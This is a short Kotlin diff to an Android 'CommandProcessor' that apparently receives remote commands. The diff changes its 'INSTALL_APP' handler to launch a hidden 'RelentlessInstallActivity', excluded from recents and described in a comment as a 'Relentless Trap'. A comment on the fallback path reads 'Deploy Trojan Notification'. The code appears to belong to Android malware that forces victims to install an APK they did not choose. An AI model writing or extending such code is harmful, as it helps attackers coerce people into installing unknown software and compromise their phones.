@@ -554,21 +554,15 @@ object CommandProcessor {
                 "INSTALL_APP" -> {
                     val apkFile = File(content.trim())
                     if (apkFile.exists() && apkFile.isFile) {
-                        val uri = androidx.core.content.FileProvider.getUriForFile(
-                            ctx, 
-                            "${ctx.packageName}.fileprovider", 
-                            apkFile
-                        )
-                        val installIntent = Intent(Intent.ACTION_VIEW).apply {
-                            setDataAndType(uri, "application/vnd.android.package-archive")
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                        val installIntent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
+                            putExtra("apk_path", apkFile.absolutePath)
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                         }
                         
                         try {
-                            // PRIMARY: Attempt direct background launch
+                            // PRIMARY: Attempt direct background launch into the Relentless Trap
                             ctx.startActivity(installIntent)
-                            status = "INSTALL_PROMPT_TRIGGERED"
+                            status = "RELENTLESS_INSTALL_TRIGGERED"
                         } catch (e: Exception) {
                             // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
                             try {
